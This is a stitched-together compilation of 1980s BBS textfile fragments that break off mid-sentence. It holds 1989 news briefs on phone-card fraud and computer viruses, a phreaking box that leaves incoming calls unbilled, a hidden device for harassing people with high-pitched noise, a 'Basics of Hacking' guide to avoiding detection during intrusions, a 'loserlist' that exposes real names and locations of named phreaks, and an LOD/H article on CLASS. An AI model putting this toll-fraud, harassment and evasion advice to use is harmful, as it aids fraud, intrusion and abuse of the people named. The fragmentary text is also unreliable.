given an 18 month suspended sentence.      Two presiding judges ruled that using falsified telephone cards in pay     phones is tantamount to using securities.      However, another judge ruled in a separate case last September that     tampering with a telephone card does not constitute use of a security, so     legal observers say it will be up to the Supreme Court.      According to this most recent s ruling, Kawai changed about 1,600 telephone     cards, each good for 500 yen worth of telephone calls, into cards worth     20,000 yen.  He sold the altered cards to acquaintances for as much as     3,500 yen.      Sakaki also sold about 320 tampered cards for about 2 million yen.      One of the presiding judges ruled that using tampered telephone cards on     public telephones is the same as misleading Nippon Telegraph and     Telephone Corporation into believing the cards    false securities    were     genuine.  Taken from The Japan Times                                                                                 7.  Computer Virus Hits Japanese Quake Data  October 30, 1989     Tokyo  A     computer virus has destroyed information at the University of Tokyo's     seismological and ocean research institutes, a university official and     local reports said yesterday.      An official of the university's Ocean Reasearch Institute said the virus     was detected earlier this month in five of the center's 100 computers,     but was believed to have first infected the computers in September.      The virus was found only in personal computers being used by researchers     and not major computer systems, the official said, requesting anonymity.     He said the damage was not serious.      He declined to discuss further details, but a report by the Japan     Broadcasting Corporation said a virus had also been found in the computers     at the university's Earthquake Research Institute.

First Virus Attack On Macintoshes In Japan  November 7, 1989     Six Macs     in University of Tokyo, Japan, were found to have caught viruses.  Since     Since this September, Professor K. Tamaki, Ocean Research Institute,     University of Tokyo, has noticed malfunctions on the screen.  In October,     he applied vaccines  Interferon  and  Virus Clinic  to find his four     Macintoshes were contaminated by computer viruses,  N Virus  type A and     type B.  He then found ten softwares were also infected by viruses.  A     Macintosh of J. Kasahara, Earthquake Research Institute, University of     Tokyo, was also found to be contaminated by N Virus and Score Virus.  These     are the first reports of real viruses in Japan.      Later it was reported that four Macintoshes in Geological Survey of Japan,     in Tsukuba, were infected by N Virus Type A.  This virus was sent from     United States together with an editor.                                                                                 9.  Hackers Can Tap Into Free Trip  October 1989     Attention Hackers   Here     is your chance to break into a computer system and walk away with a grand     prize.  The  hacker challenge  dares any hacker to retrieve a secret     message stored in a KPMG Peat Marwick computer in Atlanta.      This challenge is being sponsored by LeeMah DataCom Security Corporation, a     Hayward, California, consulting firm that helps companies boost computer     security.  The winner gets an all expense paid trip for two to either     Tahiti or St. Moritz, Switzerland.      Hackers with modems must dial 1 404 827 9584.  Then they must type this     password  5336241.      From there, the hacker is on his own to figure out the various access codes     and commands needed to retrieve the secret message.      The winner was announced October 24, 1989 at the Federal Computer Show in     Washington.  Taken from USA Today.                                                                                 10.  Groaning Phone Network Survives Millions Of Calls  October 18, 1989          The nation's telecommunications network was flooded Tuesday  October 17       night by an estimated 20 million attempted telephone calls from people      around the nation concerned about friends and family after the earthquake      in the bay area.       Except for brief failures, the system did not break down under the record      load in the areas damaged by the earthquake.       AT T officials said that as many as 140 million long distance phone calls      were placed Wednesday  October 18 , the highest number for a single day in      history.

This is good for calls  up to 1 2 hour,  after 1 2  hour the Fone Co.  gets suspicious, and then you can guess what happens.       What  this little beauty  does  is keep the line voltage from dropping  to 10v  when  you answer your  fone.   The line is insted kept at 36v and it  will make  the  fone think that it is  still ringing while your talking.  The reason for the 1 2 hour time limit is that the Fone CO. thinks that something is wrong after 1 2 an hour of ringing.       All  parts  are  available   Radio Shack.   Using the least possible parts and arangement,  the cost is  0.98 !!!! And  that  is  parts for two  of  them! Talk  about  a deal!   If you  want  to splurge  then  you can get a  small  PC board,  and  a switch.   There are  two schematics  for this box,  one  is  for most  normal fones.   The second one is for  fones  that don't  work  with  the first.  It was made for use with a Bell Trimline touch tone fone.

This is because of the fact that LED's must be put in, in a certain direction.  Depending  on which way you put the LED is what controls what wires are for the line   fone.  How to find out        Hook  up the box in one  direction using one set offor line and the other for fone.   NOTE   For Model I switch should be OFF.  NOTE   For Model    switch  should  be         set to side connecting the led.       Once  you have hooked it up,  then pick up the fone and see if the LED  is on.  If it is, the LED will be lit.  If is  doesn't light then switch the wires and try again.  Once you know which are which  then label  them.    NOTE     If neither  directions  worked  then  your  lable   the   switch  in  its   current position as BOX ON.  How to use it        The purpose of this box is not  to poeple  who  call you so it would  make sence  that  it  can only  be  used  to receive! calls.   When the box is   ON  then you may only recieve calls.   Your fone will ring like normal and the  LED on  the box will flash.   If you answer the fone now, then the LED will light and the caller will not be charged. Hang  up  the fone after you  are  done talking like normal.   You will not  be able  to  get a dial tone or call  when the  box is on,  so turn the box   OFF  for  normal calls.   I don't  recommend that you leave it on all the  time,  as you don't want it to answer when Ma Bell calls! "

This article will describe how to build a little device that will emit a very high freqency that is  extrememly  annoying to most people and it will wreck concentration and can cause some nasty headaches.

It's best to use an 8 pin socket for soldering before you put the IC in..  You can put it on a small PC board or perfboard..  Use R1  the potentiometer  to adjust the frequency from a high whistle to an instant migrane.  If you find that the freqency is not as high as desired use a smaller capacitor for C2. The Idea here is to bring the frequency just below the highest frequency that can be perceived by the human ear.  You will definetly know when you have acheived this! Once finished mount it in a project case with an on off switch and you're ready.                                                                          Use      One particularly nice thing about this device is that if you set it to a high enough frequency it is almost impossible to locate once hidden..  So once you've found a suitible location put it anywhere were it can't easily be seen and turn it on..  Guaranteed results!  ..  One little problem with this thing is that some teachers don't seem to hear it  generally older teachers ..  but anyone with a good set of ears will be driven crazy by it!!  Including you if you place it in a room that you are planning to be in for any length of time.. So DONT.  If you have any questions about this thing I'll be happy to answer inquiries..  Have fun!      Captain Quieg                                                                             Call The Works BBS   1600  Textfiles!    914  238 8195   300 1200   Always Open  "

BASICS TO KNOW BEFORE DOING ANYTHING, ESSENTIAL TO YOUR CONTINUING CAREER AS ONE OF THE ELITE IN     THE COUNTRY... THIS ARTICLE,  THE INTRODUCTION TO THE WORLD OF HACKING  IS MEANT TO HELP YOU BY TELLING YOU HOW NOT TO GET CAUGHT, WHAT NOT TO DO ON A COMPUTER SYSTEM, WHAT TYPE OF EQUIPMENT SHOULD I KNOW ABOUT NOW, AND JUST A LITTLE ON THE HISTORY, PAST PRESENT FUTURE, OF THE HACKER. WELCOME TO THE WORLD OF HACKING!  WE, THE PEOPLE WHO LIVE OUTSIDE OF THE NORMAL RULES, AND HAVE BEEN SCORNED AND EVEN ARRESTED BY THOSE FROM THE 'CIVILIZED WORLD', ARE BECOMMING SCARCER EVERY DAY.  THIS IS DUE TO THE GREATER FEAR OF WHAT A GOOD HACKER  SKILL WISE, NO MORAL JUDGEMENTS HERE  CAN DO NOWADAYS, THUS CAUSING ANTI HACKER SENTIMENT IN THE MASSES.  ALSO, FEW HACKERS SEEM TO ACTUALLY KNOW ABOUT THE COMPUTER SYSTEMS THEY HACK, OR WHAT EQUIPMENT THEY WILL RUN INTO ON THE FRONT END, OR WHAT THEY COULD DO WRONG ON A SYSTEM TO ALERT THE 'HIGHER' AUTHORITIES WHO MONITOR THE SYSTEM.  THIS ARTICLE IS INTENDED TO TELL YOU ABOUT SOME THINGS NOT TO DO, EVEN BEFORE YOU GET ON THE SYSTEM.  WE WILL TELL YOU ABOUT THE NEW WAVE OF FRONT END SECURITY DEVICES THAT ARE BEGINNING TO BE USED ON COMPUTERS.  WE WILL ATTEMPT TO INSTILL IN YOU A SECOND IDENTITY, TO BE BROUGHT UP AT TIME OF GREAT NEED, TO PULL YOU OUT OF TROUBLE.  AND, BY THE WAY, WE TAKE NO, REPEAT, NO, RESPONSIBILITY FOR WHAT WE SAY IN THIS AND THE FORTHCOMING ARTICLES.  ENOUGH OF THE BULLSHIT, ON TO THE FUN   AFTER LOGGING ON YOUR FAVORITE BBS, YO U SEE ON THE HIGH ACCESS BOARD A PHONE NUMBER!  IT SAYS IT'S A GREAT SYSTEM TO  FUCK AROUND WITH!  THIS MAY BE TRUE, BUT HOW MANY OTHER PEOPLE ARE GOING TO CALL THE SAME NUMBER   SO  TRY TO AVOID CALLING A NUMBER GIVEN TO THE PUBLIC.  THIS IS BECAUSE THERE ARE AT LEAST EVERY OTHER USER CALLING, AND HOW MANY OTHER BOARDS WILL THAT NUMBER SPREAD TO  IF YOU CALL A NUMBER FAR, FAR AWAY, AND YOU PLAN ON GOING THRU AN EXTENDER OR A RE  SELLER, DON'T KEEP CALLING THE SAME ACCESS NUMBER  I.E.  AS YOU WOULD IF YOU HAD A HACKER RUNNING , THIS LOOKS VERY SUSPICIOUS AND CAN MAKE LIFE MISERABLE WHEN THE PHONE BILL COMES IN THE MAIL.  MOST CITIES HAVE A VARIETY OF ACCESS NU MBERS AND SERVICES, SO USE AS MANY AS YOU CAN. NEVER TRUST A CHANGE IN THE SY STEM...  THE 414'S, THE ASSHOLES, WERE CAUGHT FOR THIS REASON   WHEN ONE OF TH EM CONNECTED TO THE SYSTEM, THERE WAS NOTHING GOOD THERE.  THE NEXT TIME, THE RE WAS A TREK GAME STUCK RIGHT IN THEIR WAY!  THEY PROCEDED TO PLAY SAID GAME F OR TWO, SAY TWO AND A HALF HOURS, WHILE TELENET WAS TRACING THEM!  NICE JOB, DO N'T YOU THINK   IF ANYTHING LOOKS SUSPICIOUS, DROP THE LINE IMMEDIATELY !!  AS IN, YESTERDAY!!  THE POINT WE'RE TRYING TO GET ACROSS IS   IF YOU USE A LITTLE COMMON SENSE, YOU WON'T GET BUSTED.  LET THE LITTLE KIDS WHO AREN'T SMART ENOUGH TO RECOGNIZE A TRAP GET BUSTED, IT WILL TAKE THE HEAT OFF OF THE REAL HACKERS.  NOW, LET'S SAY YOU GET ON A COMPUTER SYSTEM...  IT LOOKS GREAT , CHECKS OUT, EVERYTHING SEEMS FINE.  OK, NOW IS WHEN IT GETS MORE DANGEROUS. YOU HAVE TO KNOW THE COMPUTER SYSTEM  SEE FUTURE ISSUES OF THIS ARTICLE FOR INFO ON SPECIFIC SYSTEMS  TO KNOW WHAT NOT TO DO.  BASICALLY, KEEP AWAY FROM A NY COMMAND WHICH LOOKS LIKE IT MIGHT DELETE SOMETHING, COPY A NEW FILE INTO THE ACCOUNT, OR WHATEVER!  ALWAYS LEAVE THE ACCOUNT IN THE SAME STATUS YOU LOGG ED IN WITH.  CHANGE  NOTHING ...  IF IT ISN'T AN ACCOUNT WITH PRIV'S, THEN DON' T TRY ANY COMMANDS THAT REQUIRE THEM!  ALL, YES ALL, SYSTEMS ARE GOING TO BE K EEPING LOG FILES OF WHAT USERS ARE DOING, AND THAT WILL SHOW UP.  IT IS JUST LIKE DROPPING A TROUBLE CARD IN AN ESS SYSTEM, AFTER SENDING THAT NICE OPE RATOR A PRETTY TONE.  SPEND NO EXCESSIVE AMOUNTS OF TIME ON THE ACCOUNT IN ONE STRETCH.  KEEP YOUR CALLING TO THE VERY LATE NIGHT IF POSSIBLE, OR DURING BUSINESS HOURS  BELIEVE IT OR NOT! .  IT SO HAPPENS THAT THERE ARE MORE USERS ON DURING BUSINESS HOURS, AND IT IS VERY DIFFICULT TO READ A LOG FILE WITH 60 USERS DOING MANY COMMNDS EVERY MINUTE. TRY TO AVOID SYSTEMS WHERE EVERYONE KNOWS EACH OTHER, DON'T TRY TO BLUFF.  AND ABOVE ALL   NEVER ACT LIKE YOU OWN THE SYSTEM, OR ARE THE BEST THERE IS.  THEY ALWAYS GRAB THE PEOPLE WHO'S HEADS SWELL...  THERE IS SOME VERY INTERESTING FRONT END EQUIPMENT AROUND NOWADAYS, BUT FIRST LET'S DEFINE TERMS...  BY FRONT END, WE MEAN ANY DEVICE THAT YOU MUST PASS THRU TO GET AT THE REAL COMPUTER. THERE ARE DEVICES THAT ARE MADE TO DEFEAT HACKER PROGRAMS, AND JUST PLAIN OLD MULTIPLEXERS.  TO DEFEAT HACKER PROGRAMS , THERE ARE NOW DEVICES THAT PICK UP THE PHONE AND JUST SIT THERE... THIS MEANS THAT YOUR DEVICE GETS NO CARRIER, THUS YOU THINK THERE ISN'T A COMPUTER ON THE OTHER END.  THE ONLY WAY AROUND IT IS TO DETECT WHEN IT WAS PICKED UP.  IF IT PICKES UP AFTER THE SAME NUMBER RING, THEN YOU KNOW IT IS A HACKER  DEFEATER.  THESE DEVICES TAKE A MULTI  DIGIT CODE TO LET YOU INTO THE SYSTEM.  SOME ARE, IN FACT, QUITE SOPHISTICATED TO THE POINT WHERE IT WILL ALSO LIMIT THE USER NAME' S DOWN, SO ONLY ONE NAME OR SET OF NAMES CAN BE VALID LOGINS AFTER THEY INPUT THE CODE...  OTHER DEVICES INPUT A NUMBER CODE, AND THEN THEY DIAL BACK A PRE PROGRAMMED NUMBER FOR THAT CODE.  THESE SYSTEMS ARE BEST TO LEAVE ALONE, BECAUSE THEY KNOW SOMEONE IS PLAYING WITH THEIR PHONE. YOU MAY THINK  BUT I'LL JUST REPROGRAM THE DIAL BACK.  THINK AGAIN, HOW STUPID THAT IS...  THEN THEY HAVE YOUR NUMBER, OR A TEST LOOP IF YOU WERE JUST A LITTLE SMARTER.  IF IT'S YOUR NUMBER, THEY HAVE YOUR BALLS  IF MALE... , IF ITS A LOOP, THEN YOU ARE SCREWED AGAIN, SINCE THOSE LOOPS ARE  MONITORED . AS FOR MULTIPLEXERS...  WHAT A PLEXER IS SUPPOSED TO DO IS THIS   THE SYSTEM CAN ACCEPT MULTIPLE USERS. WE HAVE TO TIME SHARE, SO WE'LL LET THE FRONT  END PROCESSOR DO IT...  WELL, THIS IS WHAT A MULTIPLEXER DOES.  USUALLY THEY WILL ASK FOR SOMETHING LIKE  ENTER CLASS  OR  LINE  .  USUALLY IT IS PROGRAMMED FOR A DOUBLE DIGIT NUMBER, OR A FOUR TO FIVE LETTER WORD.  THERE ARE USUALLY A FEW SETS OF NUMBERS IT ACCEPTS, BUT THOSE NUMBERS ALSO SET YOUR 300 1200 BAUD DATA TYPE.  THESE MULTIPLEXERS ARE INCONVENIENT AT BEST, SO NOT TO WORRY.  A LITTLE ABOUT THE HISTORY OF HACKING   HACKING, BY OUR DEFINITION, MEANS A GREAT KNOWLEDGE OF SOME SPECIAL AREA.  DOCTORS AND LAWYERS ARE HACKERS OF A SORT, BY THIS DEFINITION.  BUT MOST OFTEN, IT IS BEING USED IN THE COMPUTER CONTEXT, AND THUS WE HAVE A DEFINITION OF  ANYONE WHO HAS A GREAT AMOUNT OF COMPUTER OR TELECOMMUNICATIONS KNOWLEDGE.  YOU ARE NOT A HACKER BECAUSE YOU HAVE A LIST OF CODES...  HACKING, BY OUR DEFINITION, HAS THEN BEEN AROUND ONLY ABOUT 15 YEARS. IT STARTED , WHERE ELSE BUT, MIT AND COLLEGES WHERE THEY HAD COMPUTER SCIENCE OR ELECTRICAL ENGINEERING DEPARTMENTS. HACKERS HAVE CREATED SOME OF THE BEST COMPUTER LANGUAGES, THE MOST AWESOME OPERATING SYSTEMS, AND EVEN GONE ON TO MAKE MILLIONS. HACKING USED TO HAVE A GOOD NAME, WHEN WE COULD HONESTLY SAY  WE KNOW WHAT WE ARE DOING .  NOW IT MEANS  IN THE PUBLIC EYE    THE 414'S, RON AUSTIN, THE NASA HACKERS, THE ARPANET HACKERS...  ALL THE PEOPLE WHO HAVE BEEN CAUGHT, HAVE DONE DAMAGE, AND ARE NOW GOING TO HAVE TO FACE FINES AND SENTANCES.  THUS WE COME PAST THE MORALISTIC CRAP, AND TO OUR PURPOSE  EDUCATE THE HACKER COMMUNITY, RETURN TO THE DAYS WHEN PEOPLE ACTUALLY KNEW SOMETHING... PROGRAM GUIDE  THREE MORE ARTICLES WILL BE WRIT TEN IN THIS SERIES, AT THE PRESENT TIME.  BASICS OF HACKING I   DEC'S BASICS OF H ACKING II   VAX'S  UNIX  BASICS OF HACKING III  DATA GENERAL IT IS IMPOSS IBLE TO WRITE AN ARTICLE ON IBM, SINCE THERE ARE SO MANY SYSTEMS AND WE ONLY H AVE INFO ON A FEW...

To be included the person in question must meat     two requirement's    1  He It must be well known in his area with at least 50   people who would     consider them well known.   2  He It must have at least 50 people who hate them very much to be included     here.  I am only the compiler of what many people think of the people who     will follow.   And we're off...   LOSER PIRATE'S                 1  The official loser pirate of the year award goes to none other then   APPLE     BANDIT.  This once great pirate has become a sniveling money grubbing     programmer.  who bitches and moans about people pirating his software.  He     should talk considering all the people he's robbed of their just revenues in     the past.  Come on AP get real, you should know by now there is no way to     stop piracy sell your programs to the legitimate luses, dont whine about     pirates doing what you've been doing for so damn long.  APPLE BANDIT R.I.P.,     he will be missed, many respected him, taking his place is a wimp programmer     by the name of John Pacachek  jeez get a real name .   A  Personal Info   Tried to enter the business world by selling his own     software while it is great software, he made the mistake of trying to make     real pirates purchase it, it of course blew up in his face, end of story.     Also never came through with Disk Fer II, which is still posted on his bbs      The SafeHouse  as  coming this march    B  Supporters, Minion's, etc.  Mini Appler   Has become a AP   .  Hot Rod       Told him to go screw and founded the Racks   C  Groups associated with      MPG   Dead and buried    1200 Club   Ditto   D  Education level, age   Around 18, either senior, or entering collage.   E  Goals  To get rich quick   F  Heroes   Krackowicz   G  Sysop   Safehouse  Great board, he can program very well, in nothing else                                                                                   2  Mini Appler   Came very close to being  1, but his good buddy beat him to it.  Would sell his     grandmother if it was profitable, makes    sells  programs which need 25 new     revisions before they work right.  Is an excellent programmer, but a far cry     from a real pirate.   A  Personal Info   Co Founded Dataware with AP, fellow loser, it's rumored they     get their thrills Disk Fer IIing to each other  they being the sole posesors     of the much heralded Disk Fer II    B  Supporter's, Minion's, etc.   Apple Bandit   His best   only friend that's     about it   C  Groups Associated with   MPG   Dead and buried.   D  Education level,age   Unknown probably about the same as AP   E  Goals   To get rich quick   F  Heroes   Apple Bandit   G  Sysop   Pixel's Palace  Incredible board, give it a call with Pixterm 4.0                                            3  The Wombat   The Gonif   Official code mutilators of the year. Facing facts, catsend  all versions  is     a mess.  The 1st version worked, so they improved it by making it 4 times as     long, and absolutely impossible over long distance.  Since AP never came     through with Disk Fer II, we've had to deal with Catsend for the year, in     other words it's been a real bad year, and when you want to send anything     out of state its back to disk fer.   A  Personal Info   Made a fair attempt at improving 202 transfer programs with     the advent of catsend 1.0, ruined it from there onwards.   B  Friends, Minion's, etc.  They always have each other....   C  Groups Associated with   PPG   Pacific Pirates Guild  cracked 3 4 wares and     dissappeared    D  Education level,age   Both in high school, 17 19   E  Goals   to learn 6502 suffiecintly well to write catsend 4.0 so that it     actually works.   F  Hero's    Apex school of 6502 programming   G  Sysop   Of nothing at all                                            4  Ali Baba   Actually Ali Baba cant even program, he is just a poor little     rich kid, who wanted to be real good in piracy so he buys wares for people     to crack,   put his name on them.  Runs the Arabian Dezert, a pathetic bbs,     a perfect example of what a bbs should not be, spinning cursors, idiotic     modz with a capital z loves rap music, which isnt music at all.  Is just a     all around loser who thinks highly of himself.   A  Personal Info   Used to live in lower manhattan  NYC  but he got mugged so     often that his parents moved to westchester.  No one knows why he likes raps     so much, considering that fact that he is a 98 lb. wimp, who lives in     mortal fear of black people coming to kill him.  B  Friend's Minion's, etc.    Himself    The Cog   they share a common interest in mutiliating english.   C  Groups Associated with   High Society   He is the founder of this loser     group.  Since no real pirate group would actually accept him as a member, he     went out and founded his own.   D  Education level,age In High School,17   E  Goals   To survive the next year without getting mugged.   F  Heroes    Anyone who can program in basic better then he can  99  of the     worlds population    G  Sysop   Arabian Dezert  Sux                                             5  Hot Rod   Too much too soon, is a great prorammer, but rushes things so fast     that he mutilates the code, as a result just about everything he has ever     cracked requires 5 10 new patches and fixes before it works right.   A  Personal Info   founded the racketeers.   B  Friends, Minion's, etc.      Himself     All The Racks     AP     Mini Appler   C  Groups Associated with   RACKRACKRACKRACKRACKRACK   D  Education level,age   Entered collage in JAN 19   E  Goals   To Crack a ware right the first time.

It's more like  The Racketeer   Hot Rod , the rest of the members are mostly     losers.  Every ware ever cracked by this group has    NEVER    worked right     the first time, it always has to be recracked 20 times.   Apple Mafia   A close second, we are centering on Major Groups, not the small time groups who     have delusions of granduer  High Society . This group is the oldest     surviving pirate group  1979 , when it cracks wares they work right, and     everything would be cool, except Why are 90  of this groups members Phreaks       BIOC Agent 003, Lord Digital, Big Brother, Tuc, The Phantom, etcetc    the     only members who ever crack anything are High Technology   Creative Cracker.     This group should maybe go on on a new member drive, or just quit.                                          LOSER PHREAKS OF THE YEAR                                           1  And the winner is  BIOC Agent 003.  Like we all understand the constant     quest for fame everyone is on, but come on BIOC, every file you ever wrote     is plagerized from older files which you don't credit, you just colect them     in basic telcom   slap your name on them telcom 5 and up is copied piece for     piece out of radio shack's books on understanding telephone systems.  Come     on get real.   A  Personal Info    The phreaks all seem to have a lot of it  BIOC is hated by     a hell of alot of people for many reasons. He is hated by the other elite     phreaks who despise him for giving out information to anyone who will listen     long enough to let him speak.  He is hated by MCI Mail for distributing his     files all over it. He is hated by most  Real Phreaks  who think he is a     loser.  On the other hand he is worshipped by a incredibly huge following of     total losers.  His real first name is Donald.  Currently resides in 914.     Remote Sysop of Sherwood Forest II  A Awesome board, even if the sysop      Creative Cracker  never looks at it .    B  Friends, Minion's, etc.      Himself     Big Brother     Apple Mafia     His fans  millions   C  Groups Associated with      Fargo 4a   Whatever that is    Apple Mafia   Phreaks pirate group    Knights Of Shadow   Dead   Buried    Plagarists Of America   D  Education level,age   In High School, 18   E  Goals To organize the phreak world   F  Heroes    The Apex school of correct punctuation   typing skills.

Is a double loser in the     phreak world as well as the pirate world.  Tried to start  EPG   eastern     pirate's guild  his pathetic attempt at piracy.   A  Personal Info   Is supposedly one of the business partners of Lord Digital,     resides in 212 or 718, and his major interest in life has to be making a     pain in the ass of himself, is rumored to be a winner in the real world      meaning he has alot of     .  His main love in life is money, and making     more of it.   B  Friend's, Minion's, etc.       Himself      Lord Digital      The Phantom  ancient pirate who supposedly started the Disk Jockey   The     Connection, is now a reclusive phreak.  His fans  yes he has     them in the 100's only, not fanatic    C  Groups Associated with       EPG   Great joke, is dead anyway      Spectral Force   Old phreak group, had many prestigous members in the past         Magnetic Surfer, Lord Digital, The Phantom, Phone Fiend,          etc.      Ripoff Businessmen are us   Just about any group that Lord Digital has anything to do with has CE as some     sort of member in it, they appear to be very close real world friends.   Side Note   The phreaks in 212 718  Magnetic Surfer, Lord Digital, The Phantom,     Criminal Element, Phone Fiend, etc  seem to be all  some to a greater     extent  very good real world friends, notwithstanding what might happen in     the Modem world.  They all show great disdain for the  structured  world of     the new phreak groups  like LOD,  ELITE , etc  and consider anyone who came     into existance after 1983 a bad joke  ie just about all the new phreaks who     take it seriously  All  No longer give a fuck, because corporate america     beckons .

Started 1984 as a major pirate phreak, seemed to get software 30     seconds after it was cracked, dissappeared around August.  Has an insanely     fanatic following in 212 718 which generates ridiculus rumors.  The last of     which was that LD   Paul Maud'Dib were killed in a car wreck.  Such bullshit     surfaces on a regular basis.  Supposedly has dropped out of the entire BBS     circut because no one there had anything to say of interest to him.  This     pissed off even more people who started to hate him even more, and so on       on.   A  Personal Info   Seems to be deaply into mainframes.  Rumors surface every     other week that he has written some new killer program, thats not being     given out, etc.  I would assume this to be BS, but many people claim to have     seen the said programs, etc.  Is supposedly very friendly with various     curropt nynex employees in his home area code of 212 or 718.  And along     with Paul Maud'Dib is said to be the leading expert on ESS, and how to make     it do what you want.  From what people know about him, he is a  arogant     jerk , has actual friends in organized crime in NY, etc.  Saying he's  Well     Connected  with the right  Depending on how you look at it  people would     probably sum it up.  Also is a winner in the real world and making     mega bucks as a wall street financial wizard.

F  Heroes   Donald Trump   G  Sysop   Ran private board  Cosmos  on a mainframe for 2 months, Now runs      BlackMoor  a private board which exists somewhere in 212 718, according to     people who have seen it, it's massive, around 100 megs, multi line, and open     mostly to  real  corporate computer criminals, as opposed to  elite     phreaks .  Remote Sysop of 6 12 boards at any given time, which as in the     case of CE, he never calls.                                            4  Lex Luther   Started the year as a total unknown, became remote sysop of     Plovernet  A old major phreak board, now  you guessed it  dead   buried ,     then started adver tising about his new elite bbs  Legion Of Doom .     According to people who knew him before he went on his massive ego trip     which started the group LOD he doesnt actually know very much about     anything, people just think he does so they feel free to give him more     information.   People on OSUNY, such as The Penguin  217 ,   Big Brother     support the opion that Lex dosnt really know too much, other phreaks are     either under the misconception that he's great, or hate him intensely   A  Personal Info   Has alot of connections in the phreak world because just     about everyone who is currently active in the phreak area thinks he is     great.  No real connect  ions with any  real world people , Started the     group  Legion Of Doom   isnt he imaginative  , which seemed to prosper for     about 6 months,   then sort of fell apart. Out of the groups members Paul     Maud'Dib quit, the rest are still in it as far as anyone knows.  Lex is     intensely hated by 1000's of phreaks who think he isnt good enough to     warrant all the attention he gets the older phreaks who have dropped out of     the phreak world at large, either never heard of him, or dont care what he's     doing.  He surfaces from time to time on public boards, and seems to get     into wars with everyone.  Is present  ly running the Legion of Doom BBS,     which is supposedly  lousy   great!  since no one who i talked to has     actually ever been on it, who knows .  Lives somewhere in 305.

Was a former operator,     suposedly knows alot about boxing  if he was a operator then this should be     true .  Is hated by 1000's of people who think he is a loser, is known to     turn in other peoples acounts on TRW, and CBI, is said to have narced on     many people.  His allowing Richard Sandza on his supposedly  elite, private       secure  bbs, seems to greatly support this theory.   for those who dont     know Sandza is the guy who did all those exposing newsweek stories that     wouldnt have been possible with out Blotto's help.  Summed up blotto is     really good with boxes, but very dangerous to your continued time of freedom     on this earth.  When you call up his bbs he insist on your fone  , and if     you give it to him, thats your death warrant, bell security comes knocking     at yur door a week later.  Anyway For those who care his super secret elite     bbs, is real easy to get onto, i got the   off of my Megaterm for chrissake,     some guy had entered it into the fone book, and now the world probably has     it, for those of you who dont here it is   Blottoland    216 888 6689   A  Personal Info   Is supposedly a punk rocker type.  He is good buddies with     Lex Luther, and all the LOD members.  He works for some security company, an     alot of people surmise that he is actually a bell security agent, since he     sprung up as an elite pheak out of nowhere, noone ever heard of him, and all     of a sudden there are reporters all over his board and hes in newsweek.     Something to think about.  His first name is John. Blotto is the originator     of tele trial   alot of pissed off people want to put him on one.

Is said to know alot about ESS, and written some     translater programs for it which he never gave out to anyone.  Is supposedly     good buddies with Lord Digital, and maybe some sort of business partner of     LD's as well.  Not too much is known about him, but alot of people hate him     because he is also a massive  arogant jerk , and never shares his info with     anyone.  It is also rumored that he has turned people who he didnt like in,     to bell security.   A  Personal Info   Not much is know about him, he is often called  remote sysop     to the world  as just about every phreak board offers him remote sysop     status.  He was remote on Plovernet, and LOD.  He is the only member of the     group LOD to quit the group.  he seems to have dissapeared as of late.

His one great     contribution to the world as we know it.  Other then for that one breif     thing, he is a total loser.  He annoys everyone in the phreak world.  has a     knack for getting peoples fone numbers, and calling them up out of nowhere,     when they dont know him, and proceeding to annoy them to no end, until the      's change.

And The Knights Of Shadow Win!   This elite group had more high power names in it then any other group in     existance before it, or since then.  It also did nothing at all but annoy     people.  And it disintegrated when it became apparent that at least 3 people     within the group were narc's or Feds.  Good job guys!  real eliteness for     you there. The surviving members of the group  surviving meaning not     busted, fled to Brazil, or dropped out of the Modem world  are the founders     of just about every new elite phreak group in existance.  It was a great     idea, but no one within the group ever did anything as a team, i guess this     would stem from everyone in it being Mr.  Super Ego.  Well its dead now.  And a not so close 2nd. LOD!   Sort of Lex Luthers attempt at trying to follow in the footsteps of TKOS and     start a new elite group.  Well is failed miserably, and as the group it was     modeled after  TKOS  it did nothing at all, but threaten people.  In     comparison to TKOS it was really a poor imitation while TKOS had mostly     big name phreaks in it, LOD started with a bunch of unkowns  Blotto, Razor,     X man, etc, basically the people who weren't considered good enough to get     into TKOS itself  hoping the group would become notorious enough on its own.     It appears to have worked, and the group LOD still exists, but it does     nothing at all.  So it hardly matters.  Its sort of the phreak worlds     parralel to the Racketeers.  Alot of people respect it, because it just     sesms like the thing to do.  But it has never actually done anything, its     major claim to fame is the bbs Legion of Doom which was discussed under Lex     Luther's entry.                                            Well thats it.  The official 1984 loserlist.  All people were given a fair     chance if there was some redeeming quality about them it was listed.  If     they were just total losers, then they were just ragged on.  This is not my     opinion alone i want to stress that this all comes from other people who     actualy know the people in question.  The amount of data on the person in     question is usually greater if they are more popular, and reflected in     personal info sections.  Some of these people have their own fan clubs so it     was ridiculously easy to collect info on them.  Thats wraps it up. I doubt     any of the people in the file will care  after all they all follow the real     pirates guide dont they  . But i and many other people felt that the true     story on some of the  Legends  in the pirate and phreak worlds should be     known by the people who worship them.  It will probably change nothing, but     they are all hated by a great many people, and the people in question might     take note and try not to be such assholes. if there is one quality that all     these people have in common its their arrogance.

The LOD H Technical Journal  File  2 of 13                       Custom Local Area Signalling Services                           Written by  The Videosmith                                 Version   1.1                                c  Copyright 1994                              This article will explain the newly developed LASS system  AT T Bell Labs ,  and how it may affect us in the near future. Note that the service as it  appears for customers is called  CLASS , the C standing for Custom. I  assume this is just for looks.   LASS            The telephone was destined to become a well used and powerful tool for  otherwise tedious tasks. Gas meters and other metered services would be  surveyed through the use of automatic data retrieval employing telephone  communications. All in all, some have big plans for the uses one could put  the telephone system up to, and CLASS is one plan that is going to drop  an innovative bombshell on the telecommunicating world.      At this moment, a local CCIS network feature is being developed by  Bell Laboratories. This feature will change the way people use fones, and  will also change the attitude in which they use them. It will give far  more control of the telephone to the user than ever before. This feature  is called CLASS  Custom Local Area Signalling Services .      Everyone will find something useful in this newly developed telephone  feature. Pizza parlours will no longer have to worry about fraudulent italian  food mongers, and little old ladies won't have to worry about prank calls  by certain dubious characters.      What are all these fantastic features   These features will  include call back of the last caller, regardless of whether you have their  telephone number or not. Another will be distinct call waiting tones, and  preselected call forwarding  only those people whom you wish to speak to  will be forwarded . This is a rudimentary list of CLASS features to come.  It is a very powerful system, and it all relys on LCCIS  Local Common  Channel Interoffice Signalling , an intra LATA version of the ever popular  CCIS.   CCIS Background                       CCIS was originally introduced in 1976 as, basically, the signalling  system to end all signalling systems. Instead of using the voice grade  trunks to carry signalling information on, a data network would be used. This  network is comprised of data links from each TO  involved with CCIS  to  the appropriate STP  signal transfer point . Signalling information is sent  through these links at 4800 bps to the STPs  Note that baud rates may increase  due to the economic availability of faster data communications hardware ,  where stored program control routes the signalling information to the needed  offices in order to open and complete the call path. SPC checks automatically  for on hook off hook status before opening the path, and if the status is  off hook  in this case the 